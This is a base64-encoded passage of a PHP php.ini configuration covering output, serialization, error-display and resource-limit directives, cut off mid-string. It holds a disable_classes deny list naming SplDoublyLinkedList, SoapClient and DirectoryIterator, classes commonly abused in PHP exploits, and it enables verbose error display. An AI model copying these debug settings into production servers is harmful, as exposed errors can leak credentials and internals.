dXRfY29tcHJlc3Npb25fbGV2ZWwgPSAtMQoKOyBZb3UgY2Fubm90IHNwZWNpZnkgYWRkaXRpb25hbCBvdXRwdXQgaGFuZGxlcnMgaWYgemxpYi5vdXRwdXRfY29tcHJlc3Npb24KOyBpcyBhY3RpdmF0ZWQgaGVyZS4gVGhpcyBzZXR0aW5nIGRvZXMgdGhlIHNhbWUgYXMgb3V0cHV0X2hhbmRsZXIgYnV0IGluCjsgYSBkaWZmZXJlbnQgb3JkZXIuCjsgaHR0cDovL3BocC5uZXQvemxpYi5vdXRwdXQtaGFuZGxlcgo7emxpYi5vdXRwdXRfaGFuZGxlciA9Cgo7IEltcGxpY2l0IGZsdXNoIHRlbGxzIFBIUCB0byB0ZWxsIHRoZSBvdXRwdXQgbGF5ZXIgdG8gZmx1c2ggaXRzZWxmCjsgYXV0b21hdGljYWxseSBhZnRlciBldmVyeSBvdXRwdXQgYmxvY2suICBUaGlzIGlzIGVxdWl2YWxlbnQgdG8gY2FsbGluZyB0aGUKOyBQSFAgZnVuY3Rpb24gZmx1c2goKSBhZnRlciBlYWNoIGFuZCBldmVyeSBjYWxsIHRvIHByaW50KCkgb3IgZWNobygpIGFuZCBlYWNoCjsgYW5kIGV2ZXJ5IEhUTUwgYmxvY2suICBUdXJuaW5nIHRoaXMgb3B0aW9uIG9uIGhhcyBzZXJpb3VzIHBlcmZvcm1hbmNlCjsgaW1wbGljYXRpb25zIGFuZCBpcyBnZW5lcmFsbHkgcmVjb21tZW5kZWQgZm9yIGRlYnVnZ2luZyBwdXJwb3NlcyBvbmx5Lgo7IGh0dHA6Ly9waHAubmV0L2ltcGxpY2l0LWZsdXNoCjsgTm90ZTogVGhpcyBkaXJlY3RpdmUgaXMgaGFyZGNvZGVkIHRvIE9uIGZvciB0aGUgQ0xJIFNBUEkKaW1wbGljaXRfZmx1c2ggPSBPZmYKCjsgVGhlIHVuc2VyaWFsaXplIGNhbGxiYWNrIGZ1bmN0aW9uIHdpbGwgYmUgY2FsbGVkICh3aXRoIHRoZSB1bmRlZmluZWQgY2xhc3MmYXBvczsKOyBuYW1lIGFzIHBhcmFtZXRlciksIGlmIHRoZSB1bnNlcmlhbGl6ZXIgZmluZHMgYW4gdW5kZWZpbmVkIGNsYXNzCjsgd2hpY2ggc2hvdWxkIGJlIGluc3RhbnRpYXRlZC4gQSB3YXJuaW5nIGFwcGVhcnMgaWYgdGhlIHNwZWNpZmllZCBmdW5jdGlvbiBpcwo7IG5vdCBkZWZpbmVkLCBvciBpZiB0aGUgZnVuY3Rpb24gZG9lc24mYXBvczt0IGluY2x1ZGUvaW1wbGVtZW50IHRoZSBtaXNzaW5nIGNsYXNzLgo7IFNvIG9ubHkgc2V0IHRoaXMgZW50cnksIGlmIHlvdSByZWFsbHkgd2FudCB0byBpbXBsZW1lbnQgc3VjaCBhCjsgY2FsbGJhY2stZnVuY3Rpb24uCnVuc2VyaWFsaXplX2NhbGxiYWNrX2Z1bmMgPQoKOyBXaGVuIGZsb2F0cyAmYW1wOyBkb3VibGVzIGFyZSBzZXJpYWxpemVkLCBzdG9yZSBzZXJpYWxpemVfcHJlY2lzaW9uIHNpZ25pZmljYW50CjsgZGlnaXRzIGFmdGVyIHRoZSBmbG9hdGluZyBwb2ludC4gVGhlIGRlZmF1bHQgdmFsdWUgZW5zdXJlcyB0aGF0IHdoZW4gZmxvYXRzCjsgYXJlIGRlY29kZWQgd2l0aCB1bnNlcmlhbGl6ZSwgdGhlIGRhdGEgd2lsbCByZW1haW4gdGhlIHNhbWUuCjsgVGhlIHZhbHVlIGlzIGFsc28gdXNlZCBmb3IganNvbl9lbmNvZGUgd2hlbiBlbmNvZGluZyBkb3VibGUgdmFsdWVzLgo7IElmIC0xIGlzIHVzZWQsIHRoZW4gZHRvYSBtb2RlIDAgaXMgdXNlZCB3aGljaCBhdXRvbWF0aWNhbGx5IHNlbGVjdCB0aGUgYmVzdAo7IHByZWNpc2lvbi4Kc2VyaWFsaXplX3ByZWNpc2lvbiA9IC0xCgo7IG9wZW5fYmFzZWRpciwgaWYgc2V0LCBsaW1pdHMgYWxsIGZpbGUgb3BlcmF0aW9ucyB0byB0aGUgZGVmaW5lZCBkaXJlY3RvcnkKOyBhbmQgYmVsb3cuICBUaGlzIGRpcmVjdGl2ZSBtYWtlcyBtb3N0IHNlbnNlIGlmIHVzZWQgaW4gYSBwZXItZGlyZWN0b3J5Cjsgb3IgcGVyLXZpcnR1YWxob3N0IHdlYiBzZXJ2ZXIgY29uZmlndXJhdGlvbiBmaWxlLgo7IE5vdGU6IGRpc2FibGVzIHRoZSByZWFscGF0aCBjYWNoZQo7IGh0dHA6Ly9waHAubmV0L29wZW4tYmFzZWRpcgpvcGVuX2Jhc2VkaXIgPSAKCjsgVGhpcyBkaXJlY3RpdmUgYWxsb3dzIHlvdSB0byBkaXNhYmxlIGNlcnRhaW4gZnVuY3Rpb25zIGZvciBzZWN1cml0eSByZWFzb25zLgo7IEl0IHJlY2VpdmVzIGEgY29tbWEtZGVsaW1pdGVkIGxpc3Qgb2YgZnVuY3Rpb24gbmFtZXMuCjsgaHR0cDovL3BocC5uZXQvZGlzYWJsZS1mdW5jdGlvbnMKZGlzYWJsZV9mdW5jdGlvbnMgPSAKCjsgVGhpcyBkaXJlY3RpdmUgYWxsb3dzIHlvdSB0byBkaXNhYmxlIGNlcnRhaW4gY2xhc3NlcyBmb3Igc2VjdXJpdHkgcmVhc29ucy4KOyBJdCByZWNlaXZlcyBhIGNvbW1hLWRlbGltaXRlZCBsaXN0IG9mIGNsYXNzIG5hbWVzLgo7IGh0dHA6Ly9waHAubmV0L2Rpc2FibGUtY2xhc3NlcwpkaXNhYmxlX2NsYXNzZXMgPSBTcGxEb3VibHlMaW5rZWRMaXN0LFNvYXBDbGllbnQsRGlyZWN0b3J5SXRlcmF0b3IKCjsgQ29sb3JzIGZvciBTeW50YXggSGlnaGxpZ2h0aW5nIG1vZGUuICBBbnl0aGluZyB0aGF0JmFwb3M7cyBhY2NlcHRhYmxlIGluCjsgJmx0O3NwYW4gc3R5bGU9JnF1b3Q7Y29sb3I6ID8/Pz8/Pz8mcXVvdDsmZ3Q7IHdvdWxkIHdvcmsuCjsgaHR0cDovL3BocC5uZXQvc3ludGF4LWhpZ2hsaWdodGluZwo7aGlnaGxpZ2h0LnN0cmluZyAgPSAjREQwMDAwCjtoaWdobGlnaHQuY29tbWVudCA9ICNGRjk5MDAKO2hpZ2hsaWdodC5rZXl3b3JkID0gIzAwNzcwMAo7aGlnaGxpZ2h0LmRlZmF1bHQgPSAjMDAwMEJCCjtoaWdobGlnaHQuaHRtbCAgICA9ICMwMDAwMDAKCjsgSWYgZW5hYmxlZCwgdGhlIHJlcXVlc3Qgd2lsbCBiZSBhbGxvd2VkIHRvIGNvbXBsZXRlIGV2ZW4gaWYgdGhlIHVzZXIgYWJvcnRzCjsgdGhlIHJlcXVlc3QuIENvbnNpZGVyIGVuYWJsaW5nIGl0IGlmIGV4ZWN1dGluZyBsb25nIHJlcXVlc3RzLCB3aGljaCBtYXkgZW5kIHVwCjsgYmVpbmcgaW50ZXJydXB0ZWQgYnkgdGhlIHVzZXIgb3IgYSBicm93c2VyIHRpbWluZyBvdXQuIFBIUCZhcG9zO3MgZGVmYXVsdCBiZWhhdmlvcgo7IGlzIHRvIGRpc2FibGUgdGhpcyBmZWF0dXJlLgo7IGh0dHA6Ly9waHAubmV0L2lnbm9yZS11c2VyLWFib3J0CjtpZ25vcmVfdXNlcl9hYm9ydCA9IE9uCgo7IERldGVybWluZXMgdGhlIHNpemUgb2YgdGhlIHJlYWxwYXRoIGNhY2hlIHRvIGJlIHVzZWQgYnkgUEhQLiBUaGlzIHZhbHVlIHNob3VsZAo7IGJlIGluY3JlYXNlZCBvbiBzeXN0ZW1zIHdoZXJlIFBIUCBvcGVucyBtYW55IGZpbGVzIHRvIHJlZmxlY3QgdGhlIHF1YW50aXR5IG9mCjsgdGhlIGZpbGUgb3BlcmF0aW9ucyBwZXJmb3JtZWQuCjsgTm90ZTogaWYgb3Blbl9iYXNlZGlyIGlzIHNldCwgdGhlIGNhY2hlIGlzIGRpc2FibGVkCjsgaHR0cDovL3BocC5uZXQvcmVhbHBhdGgtY2FjaGUtc2l6ZQo7cmVhbHBhdGhfY2FjaGVfc2l6ZSA9IDQwOTZrCgo7IER1cmF0aW9uIG9mIHRpbWUsIGluIHNlY29uZHMgZm9yIHdoaWNoIHRvIGNhY2hlIHJlYWxwYXRoIGluZm9ybWF0aW9uIGZvciBhIGdpdmVuCjsgZmlsZSBvciBkaXJlY3RvcnkuIEZvciBzeXN0ZW1zIHdpdGggcmFyZWx5IGNoYW5naW5nIGZpbGVzLCBjb25zaWRlciBpbmNyZWFzaW5nIHRoaXMKOyB2YWx1ZS4KOyBodHRwOi8vcGhwLm5ldC9yZWFscGF0aC1jYWNoZS10dGwKO3JlYWxwYXRoX2NhY2hlX3R0bCA9IDEyMAoKOyBFbmFibGVzIG9yIGRpc2FibGVzIHRoZSBjaXJjdWxhciByZWZlcmVuY2UgY29sbGVjdG9yLgo7IGh0dHA6Ly9waHAubmV0L3plbmQuZW5hYmxlLWdjCnplbmQuZW5hYmxlX2djID0gT24KCjsgSWYgZW5hYmxlZCwgc2NyaXB0cyBtYXkgYmUgd3JpdHRlbiBpbiBlbmNvZGluZ3MgdGhhdCBhcmUgaW5jb21wYXRpYmxlIHdpdGgKOyB0aGUgc2Nhbm5lci4gIENQOTM2LCBCaWc1LCBDUDk0OSBhbmQgU2hpZnRfSklTIGFyZSB0aGUgZXhhbXBsZXMgb2Ygc3VjaAo7IGVuY29kaW5ncy4gIFRvIHVzZSB0aGlzIGZlYXR1cmUsIG1ic3RyaW5nIGV4dGVuc2lvbiBtdXN0IGJlIGVuYWJsZWQuCjsgRGVmYXVsdDogT2ZmCjt6ZW5kLm11bHRpYnl0ZSA9IE9mZgoKOyBBbGxvd3MgdG8gc2V0IHRoZSBkZWZhdWx0IGVuY29kaW5nIGZvciB0aGUgc2NyaXB0cy4gIFRoaXMgdmFsdWUgd2lsbCBiZSB1c2VkCjsgdW5sZXNzICZxdW90O2RlY2xhcmUoZW5jb2Rpbmc9Li4uKSZxdW90OyBkaXJlY3RpdmUgYXBwZWFycyBhdCB0aGUgdG9wIG9mIHRoZSBzY3JpcHQuCjsgT25seSBhZmZlY3RzIGlmIHplbmQubXVsdGlieXRlIGlzIHNldC4KOyBEZWZhdWx0OiAmcXVvdDsmcXVvdDsKO3plbmQuc2NyaXB0X2VuY29kaW5nID0KCjs7Ozs7Ozs7Ozs7Ozs7Ozs7CjsgTWlzY2VsbGFuZW91cyA7Cjs7Ozs7Ozs7Ozs7Ozs7Ozs7Cgo7IERlY2lkZXMgd2hldGhlciBQSFAgbWF5IGV4cG9zZSB0aGUgZmFjdCB0aGF0IGl0IGlzIGluc3RhbGxlZCBvbiB0aGUgc2VydmVyCjsgKGUuZy4gYnkgYWRkaW5nIGl0cyBzaWduYXR1cmUgdG8gdGhlIFdlYiBzZXJ2ZXIgaGVhZGVyKS4gIEl0IGlzIG5vIHNlY3VyaXR5CjsgdGhyZWF0IGluIGFueSB3YXksIGJ1dCBpdCBtYWtlcyBpdCBwb3NzaWJsZSB0byBkZXRlcm1pbmUgd2hldGhlciB5b3UgdXNlIFBIUAo7IG9uIHlvdXIgc2VydmVyIG9yIG5vdC4KOyBodHRwOi8vcGhwLm5ldC9leHBvc2UtcGhwCmV4cG9zZV9waHAgPSBPbgoKOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Owo7IFJlc291cmNlIExpbWl0cyA7Cjs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKCjsgTWF4aW11bSBleGVjdXRpb24gdGltZSBvZiBlYWNoIHNjcmlwdCwgaW4gc2Vjb25kcwo7IGh0dHA6Ly9waHAubmV0L21heC1leGVjdXRpb24tdGltZQo7IE5vdGU6IFRoaXMgZGlyZWN0aXZlIGlzIGhhcmRjb2RlZCB0byAwIGZvciB0aGUgQ0xJIFNBUEkKbWF4X2V4ZWN1dGlvbl90aW1lID0gMzAKCjsgTWF4aW11bSBhbW91bnQgb2YgdGltZSBlYWNoIHNjcmlwdCBtYXkgc3BlbmQgcGFyc2luZyByZXF1ZXN0IGRhdGEuIEl0JmFwb3M7cyBhIGdvb2QKOyBpZGVhIHRvIGxpbWl0IHRoaXMgdGltZSBvbiBwcm9kdWN0aW9ucyBzZXJ2ZXJzIGluIG9yZGVyIHRvIGVsaW1pbmF0ZSB1bmV4cGVjdGVkbHkKOyBsb25nIHJ1bm5pbmcgc2NyaXB0cy4KOyBOb3RlOiBUaGlzIGRpcmVjdGl2ZSBpcyBoYXJkY29kZWQgdG8gLTEgZm9yIHRoZSBDTEkgU0FQSQo7IERlZmF1bHQgVmFsdWU6IC0xIChVbmxpbWl0ZWQpCjsgRGV2ZWxvcG1lbnQgVmFsdWU6IDYwICg2MCBzZWNvbmRzKQo7IFByb2R1Y3Rpb24gVmFsdWU6IDYwICg2MCBzZWNvbmRzKQo7IGh0dHA6Ly9waHAubmV0L21heC1pbnB1dC10aW1lCm1heF9pbnB1dF90aW1lID0gNjAKCjsgTWF4aW11bSBpbnB1dCB2YXJpYWJsZSBuZXN0aW5nIGxldmVsCjsgaHR0cDovL3BocC5uZXQvbWF4LWlucHV0LW5lc3RpbmctbGV2ZWwKO21heF9pbnB1dF9uZXN0aW5nX2xldmVsID0gNjQKCjsgSG93IG1hbnkgR0VUL1BPU1QvQ09PS0lFIGlucHV0IHZhcmlhYmxlcyBtYXkgYmUgYWNjZXB0ZWQKO21heF9pbnB1dF92YXJzID0gMTAwMAoKOyBNYXhpbXVtIGFtb3VudCBvZiBtZW1vcnkgYSBzY3JpcHQgbWF5IGNvbnN1bWUgKDEyOE1CKQo7IGh0dHA6Ly9waHAubmV0L21lbW9yeS1saW1pdAptZW1vcnlfbGltaXQgPSAxMjhNCgo7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBFcnJvciBoYW5kbGluZyBhbmQgbG9nZ2luZyA7Cjs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OwoKOyBUaGlzIGRpcmVjdGl2ZSBpbmZvcm1zIFBIUCBvZiB3aGljaCBlcnJvcnMsIHdhcm5pbmdzIGFuZCBub3RpY2VzIHlvdSB3b3VsZCBsaWtlCjsgaXQgdG8gdGFrZSBhY3Rpb24gZm9yLiBUaGUgcmVjb21tZW5kZWQgd2F5IG9mIHNldHRpbmcgdmFsdWVzIGZvciB0aGlzCjsgZGlyZWN0aXZlIGlzIHRocm91Z2ggdGhlIHVzZSBvZiB0aGUgZXJyb3IgbGV2ZWwgY29uc3RhbnRzIGFuZCBiaXR3aXNlCjsgb3BlcmF0b3JzLiBUaGUgZXJyb3IgbGV2ZWwgY29uc3RhbnRzIGFyZSBiZWxvdyBoZXJlIGZvciBjb252ZW5pZW5jZSBhcyB3ZWxsIGFzCjsgc29tZSBjb21tb24gc2V0dGluZ3MgYW5kIHRoZWlyIG1lYW5pbmdzLgo7IEJ5IGRlZmF1bHQsIFBIUCBpcyBzZXQgdG8gdGFrZSBhY3Rpb24gb24gYWxsIGVycm9ycywgbm90aWNlcyBhbmQgd2FybmluZ3MgRVhDRVBUCjsgdGhvc2UgcmVsYXRlZCB0byBFX05PVElDRSBhbmQgRV9TVFJJQ1QsIHdoaWNoIHRvZ2V0aGVyIGNvdmVyIGJlc3QgcHJhY3RpY2VzIGFuZAo7IHJlY29tbWVuZGVkIGNvZGluZyBzdGFuZGFyZHMgaW4gUEhQLiBGb3IgcGVyZm9ybWFuY2UgcmVhc29ucywgdGhpcyBpcyB0aGUKOyByZWNvbW1lbmQgZXJyb3IgcmVwb3J0aW5nIHNldHRpbmcuIFlvdXIgcHJvZHVjdGlvbiBzZXJ2ZXIgc2hvdWxkbiZhcG9zO3QgYmUgd2FzdGluZwo7IHJlc291cmNlcyBjb21wbGFpbmluZyBhYm91dCBiZXN0IHByYWN0aWNlcyBhbmQgY29kaW5nIHN0YW5kYXJkcy4gVGhhdCZhcG9zO3Mgd2hhdAo7IGRldmVsb3BtZW50IHNlcnZlcnMgYW5kIGRldmVsb3BtZW50IHNldHRpbmdzIGFyZSBmb3IuCjsgTm90ZTogVGhlIHBocC5pbmktZGV2ZWxvcG1lbnQgZmlsZSBoYXMgdGhpcyBzZXR0aW5nIGFzIEVfQUxMLiBUaGlzCjsgbWVhbnMgaXQgcHJldHR5IG11Y2ggcmVwb3J0cyBldmVyeXRoaW5nIHdoaWNoIGlzIGV4YWN0bHkgd2hhdCB5b3Ugd2FudCBkdXJpbmcKOyBkZXZlbG9wbWVudCBhbmQgZWFybHkgdGVzdGluZy4KOwo7IEVycm9yIExldmVsIENvbnN0YW50czoKOyBFX0FMTCAgICAgICAgICAgICAtIEFsbCBlcnJvcnMgYW5kIHdhcm5pbmdzIChpbmNsdWRlcyBFX1NUUklDVCBhcyBvZiBQSFAgNS40LjApCjsgRV9FUlJPUiAgICAgICAgICAgLSBmYXRhbCBydW4tdGltZSBlcnJvcnMKOyBFX1JFQ09WRVJBQkxFX0VSUk9SICAtIGFsbW9zdCBmYXRhbCBydW4tdGltZSBlcnJvcnMKOyBFX1dBUk5JTkcgICAgICAgICAtIHJ1bi10aW1lIHdhcm5pbmdzIChub24tZmF0YWwgZXJyb3JzKQo7IEVfUEFSU0UgICAgICAgICAgIC0gY29tcGlsZS10aW1lIHBhcnNlIGVycm9ycwo7IEVfTk9USUNFICAgICAgICAgIC0gcnVuLXRpbWUgbm90aWNlcyAodGhlc2UgYXJlIHdhcm5pbmdzIHdoaWNoIG9mdGVuIHJlc3VsdAo7ICAgICAgICAgICAgICAgICAgICAgZnJvbSBhIGJ1ZyBpbiB5b3VyIGNvZGUsIGJ1dCBpdCZhcG9zO3MgcG9zc2libGUgdGhhdCBpdCB3YXMKOyAgICAgICAgICAgICAgICAgICAgIGludGVudGlvbmFsIChlLmcuLCB1c2luZyBhbiB1bmluaXRpYWxpemVkIHZhcmlhYmxlIGFuZAo7ICAgICAgICAgICAgICAgICAgICAgcmVseWluZyBvbiB0aGUgZmFjdCBpdCBpcyBhdXRvbWF0aWNhbGx5IGluaXRpYWxpemVkIHRvIGFuCjsgICAgICAgICAgICAgICAgICAgICBlbXB0eSBzdHJpbmcpCjsgRV9TVFJJQ1QgICAgICAgICAgLSBydW4tdGltZSBub3RpY2VzLCBlbmFibGUgdG8gaGF2ZSBQSFAgc3VnZ2VzdCBjaGFuZ2VzCjsgICAgICAgICAgICAgICAgICAgICB0byB5b3VyIGNvZGUgd2hpY2ggd2lsbCBlbnN1cmUgdGhlIGJlc3QgaW50ZXJvcGVyYWJpbGl0eQo7ICAgICAgICAgICAgICAgICAgICAgYW5kIGZvcndhcmQgY29tcGF0aWJpbGl0eSBvZiB5b3VyIGNvZGUKOyBFX0NPUkVfRVJST1IgICAgICAtIGZhdGFsIGVycm9ycyB0aGF0IG9jY3VyIGR1cmluZyBQSFAmYXBvcztzIGluaXRpYWwgc3RhcnR1cAo7IEVfQ09SRV9XQVJOSU5HICAgIC0gd2FybmluZ3MgKG5vbi1mYXRhbCBlcnJvcnMpIHRoYXQgb2NjdXIgZHVyaW5nIFBIUCZhcG9zO3MKOyAgICAgICAgICAgICAgICAgICAgIGluaXRpYWwgc3RhcnR1cAo7IEVfQ09NUElMRV9FUlJPUiAgIC0gZmF0YWwgY29tcGlsZS10aW1lIGVycm9ycwo7IEVfQ09NUElMRV9XQVJOSU5HIC0gY29tcGlsZS10aW1lIHdhcm5pbmdzIChub24tZmF0YWwgZXJyb3JzKQo7IEVfVVNFUl9FUlJPUiAgICAgIC0gdXNlci1nZW5lcmF0ZWQgZXJyb3IgbWVzc2FnZQo7IEVfVVNFUl9XQVJOSU5HICAgIC0gdXNlci1nZW5lcmF0ZWQgd2FybmluZyBtZXNzYWdlCjsgRV9VU0VSX05PVElDRSAgICAgLSB1c2VyLWdlbmVyYXRlZCBub3RpY2UgbWVzc2FnZQo7IEVfREVQUkVDQVRFRCAgICAgIC0gd2FybiBhYm91dCBjb2RlIHRoYXQgd2lsbCBub3Qgd29yayBpbiBmdXR1cmUgdmVyc2lvbnMKOyAgICAgICAgICAgICAgICAgICAgIG9mIFBIUAo7IEVfVVNFUl9ERVBSRUNBVEVEIC0gdXNlci1nZW5lcmF0ZWQgZGVwcmVjYXRpb24gd2FybmluZ3MKOwo7IENvbW1vbiBWYWx1ZXM6CjsgICBFX0FMTCAoU2hvdyBhbGwgZXJyb3JzLCB3YXJuaW5ncyBhbmQgbm90aWNlcyBpbmNsdWRpbmcgY29kaW5nIHN0YW5kYXJkcy4pCjsgICBFX0FMTCAmYW1wOyB+RV9OT1RJQ0UgIChTaG93IGFsbCBlcnJvcnMsIGV4Y2VwdCBmb3Igbm90aWNlcykKOyAgIEVfQUxMICZhbXA7IH5FX05PVElDRSAmYW1wOyB+RV9TVFJJQ1QgIChTaG93IGFsbCBlcnJvcnMsIGV4Y2VwdCBmb3Igbm90aWNlcyBhbmQgY29kaW5nIHN0YW5kYXJkcyB3YXJuaW5ncy4pCjsgICBFX0NPTVBJTEVfRVJST1J8RV9SRUNPVkVSQUJMRV9FUlJPUnxFX0VSUk9SfEVfQ09SRV9FUlJPUiAgKFNob3cgb25seSBlcnJvcnMpCjsgRGVmYXVsdCBWYWx1ZTogRV9BTEwgJmFtcDsgfkVfTk9USUNFICZhbXA7IH5FX1NUUklDVCAmYW1wOyB+RV9ERVBSRUNBVEVECjsgRGV2ZWxvcG1lbnQgVmFsdWU6IEVfQUxMCjsgUHJvZHVjdGlvbiBWYWx1ZTogRV9BTEwgJmFtcDsgfkVfREVQUkVDQVRFRCAmYW1wOyB+RV9TVFJJQ1QKOyBodHRwOi8vcGhwLm5ldC9lcnJvci1yZXBvcnRpbmcKZXJyb3JfcmVwb3J0aW5nID0gRV9BTEwKCjsgVGhpcyBkaXJlY3RpdmUgY29udHJvbHMgd2hldGhlciBvciBub3QgYW5kIHdoZXJlIFBIUCB3aWxsIG91dHB1dCBlcnJvcnMsCjsgbm90aWNlcyBhbmQgd2FybmluZ3MgdG9vLiBFcnJvciBvdXRwdXQgaXMgdmVyeSB1c2VmdWwgZHVyaW5nIGRldmVsb3BtZW50LCBidXQKOyBpdCBjb3VsZCBiZSB2ZXJ5IGRhbmdlcm91cyBpbiBwcm9kdWN0aW9uIGVudmlyb25tZW50cy4gRGVwZW5kaW5nIG9uIHRoZSBjb2RlCjsgd2hpY2ggaXMgdHJpZ2dlcmluZyB0aGUgZXJyb3IsIHNlbnNpdGl2ZSBpbmZvcm1hdGlvbiBjb3VsZCBwb3RlbnRpYWxseSBsZWFrCjsgb3V0IG9mIHlvdXIgYXBwbGljYXRpb24gc3VjaCBhcyBkYXRhYmFzZSB1c2VybmFtZXMgYW5kIHBhc3N3b3JkcyBvciB3b3JzZS4KOyBGb3IgcHJvZHVjdGlvbiBlbnZpcm9ubWVudHMsIHdlIHJlY29tbWVuZCBsb2dnaW5nIGVycm9ycyByYXRoZXIgdGhhbgo7IHNlbmRpbmcgdGhlbSB0byBTVERPVVQuCjsgUG9zc2libGUgVmFsdWVzOgo7ICAgT2ZmID0gRG8gbm90IGRpc3BsYXkgYW55IGVycm9ycwo7ICAgc3RkZXJyID0gRGlzcGxheSBlcnJvcnMgdG8gU1RERVJSIChhZmZlY3RzIG9ubHkgQ0dJL0NMSSBiaW5hcmllcyEpCjsgICBPbiBvciBzdGRvdXQgPSBEaXNwbGF5IGVycm9ycyB0byBTVERPVVQKOyBEZWZhdWx0IFZhbHVlOiBPbgo7IERldmVsb3BtZW50IFZhbHVlOiBPbgo7IFByb2R1Y3Rpb24gVmFsdWU6IE9mZgo7IGh0dHA6Ly9waHAubmV0L2Rpc3BsYXktZXJyb3JzCmRpc3BsYXlfZXJyb3JzID0gT24KCjsgVGhlIGRpc3BsYXkgb2YgZXJyb3JzIHdoaWNoIG9jY3VyIGR1cmluZyBQSFAmYXBvcztzIHN0YXJ0dXAgc2VxdWVuY2UgYXJlIGhhbmRsZWQKOyBzZXBhcmF0ZWx5IGZyb20gZGlzcGxheV9lcnJvcnMuIFBIUCZhcG9zO3MgZGVmYXVsdCBiZWhhdmlvciBpcyB0byBzdXBwcmVzcyB0aG9zZQo7IGVycm9ycyBmcm9tIGNsaWVudHMuIFR1cm5pbmcgdGhlIGRpc3BsYXkgb2Ygc3RhcnR1cCBlcnJvcnMgb24gY2FuIGJlIHVzZWZ1bCBpbgo7IGRlYnVnZ2luZyBjb25maWd1cmF0aW9uIHByb2JsZW1zLiBXZSBzdHJvbmdseSByZWNvbW1lbmQgeW91Cjsgc2V0IHRoaXMgdG8gJmFwb3M7b2ZmJmFwb3M7IGZvciBwcm9kdWN0aW9uIHNlcnZlcnMuCjsgRGVmYXVsdCBWYWx1ZTogT2ZmCjsgRGV2ZWxvcG1lbnQgVmFsdWU6IE9uCjsgUHJvZHVjdGlvbiBWYWx1ZTogT2ZmCjsgaHR0cDovL3BocC5uZXQvZGlzcGxheS1zdGFydHVwLWVycm9ycwpkaXNwbGF5X3N0YXJ0dXBfZXJyb3JzID0gT24KCjsgQmVzaWRlcyBkaXNwbGF5aW5nIGVycm9ycywgUEhQIGNhbiBhbHNvIGxvZyBlcnJvcnMgdG8gbG9jYXRpb25zIHN1Y2ggYXMgYQo7IHNlcnZlci1zcGVjaWZpYyBsb2csIFNUREVSUiwgb3IgYSBsb2NhdGlvbiBzcGVjaWZpZWQgYnkgdGhlIGVycm9yX2xvZwo7IGRpcmVjdGl2ZSBmb3VuZCBiZWxvdy4gV2hpbGUgZXJyb3JzIHNob3VsZCBub3QgYmUgZGlzcGxheWVkIG9uIHByb2R1Y3Rpb25zCjsgc2VydmVycyB0aGV5IHNob3VsZCBzdGlsbCBiZSBtb25pdG9yZWQgYW5kIGxvZ2dpbmcgaXMgYSBncmVhdCB3YXkgdG8gZG8gdGhhdC4KOyBEZWZhdWx0IFZhbHVlOiBPZmYKOyBEZXZlbG9wbWVudCBWYWx1ZTogT24KOyBQcm9kdWN0aW9uIFZhbHVlOiBPbgo7IGh0dHA6Ly9waHAubmV0L2xvZy1lcnJvcnMKbG9nX2Vycm9ycyA9IE9uCgo7IFNldCBtYXhpbXVtIGxlbmd0aCBvZiBsb2dfZXJyb3JzLiBJbiBlcnJvcl9sb2cgaW5mb3JtYXRpb24gYWJvdXQgdGhlIHNvdXJjZSBpcwo7IGFkZGVkLiBUaGUgZGVmYXVsdCBpcyAxMDI0IGFuZCAwIGFsbG93cyB0byBub3QgYXBwbHkgYW55IG1heGltdW0gbGVuZ3RoIGF0IGFsbC4KOyBodHRwOi8vcGhwLm5ldC9sb2ctZXJyb3JzLW1heC1sZW4KbG9nX2Vycm9yc19tYXhfbGVuID0gMTAyNAoKOyBEbyBub3QgbG9nIHJlcGVhdGVkIG1lc3NhZ2VzLiBSZXBlYXRlZCBlcnJvcnMgbXVzdCBvY2N1ciBpbiBzYW1lIGZpbGUgb24gc2FtZQo7IGxpbmUgdW5sZXNzIGlnbm9yZV9yZXBlYXRlZF9zb3VyY2UgaXMgc2V0IHRydWUuCjsgaHR0cDovL3BocC5uZXQvaWdub3JlLXJlcGVhdGVkLWVycm9ycwppZ25vcmVfcmVwZWF0ZWRfZXJyb3JzID0gT2ZmCgo7IElnbm9yZSBzb3VyY2Ugb2YgbWVzc2FnZSB3aGVuIGlnbm9yaW5nIHJlcGVhdGVkIG1lc3NhZ2VzLiBXaGVuIHRoaXMgc2V0dGluZwo7IGlzIE9uIHlvdSB3aWxsIG5vdCBsb2cgZXJyb3JzIHdpdGggcmVwZWF0ZWQgbWVzc2FnZXMgZnJvbSBkaWZmZXJlbnQgZmlsZXMgb3IKOyBzb3VyY2UgbGluZXMuCjsgaHR0cDovL3BocC5uZXQvaWdub3JlLXJlcGVhdGVkLXNvdXJjZQppZ25vcmVfcmVwZWF0ZWRfc291cmNlID0gT2ZmCgo7IElmIHRoaXMgcGFyYW1ldGVyIGlzIHNldCB0byBPZmYsIHRoZW4gbWVtb3J5IGxlYWtzIHdpbGwgbm90IGJlIHNob3duIChvbgo7IHN0ZG91dCBvciBpbiB0aGUgbG9nKS4gVGhpcyBoYXMgb25seSBlZmZlY3QgaW4gYSBkZWJ1ZyBjb21waWxlLCBhbmQgaWYKOyBlcnJvciByZXBvcnRpbmcgaW5jbHVkZXMgRV9XQVJOSU5HIGluIHRoZSBhbGxvd2VkIGxpc3QKOyBodHRwOi8vcGhwLm5ldC9yZXBvcnQtbWVtbGVha3MKcmVwb3J0X21lbWxlYWtzID0gT24KCjsgVGhpcyBzZXR0aW5nIGlzIG9uIGJ5IGRlZmF1bHQuCjtyZXBvcnRfemVuZF9kZWJ1ZyA9IDAKCjsgU3RvcmUgdGhlIGxhc3QgZXJyb3Ivd2FybmluZyBtZXNzYWdlIGluICRwaHBfZXJyb3Jtc2cgKGJvb2xlYW4pLgo7IFRoaXMgZGlyZWN0aXZlIGlzIERFUFJFQ0FURUQuCjsgRGVmYXVsdCBWYWx1ZTogT2ZmCjsgRGV2ZWxvcG1lbnQgVmFsdWU6IE9mZgo7IFByb2R1Y3Rpb24gVmFsdWU6IE9mZgo7IGh0dHA6Ly9waHAubmV0L3RyYWNrLWVycm9ycwo7dHJhY2tfZXJyb3JzID0gT2ZmCgo7IFR1cm4gb2ZmIG5vcm1hbCBlcnJvciByZXBvcnRpbmcgYW5kIGVtaXQgWE1MLVJQQyBlcnJvciBYTUwKOyBodHRwOi8vcGhwLm5ldC94bWxycGMtZXJyb3JzCjt4bWxycGNfZXJyb3JzID0gMAoKOyBBbiBYTUwtUl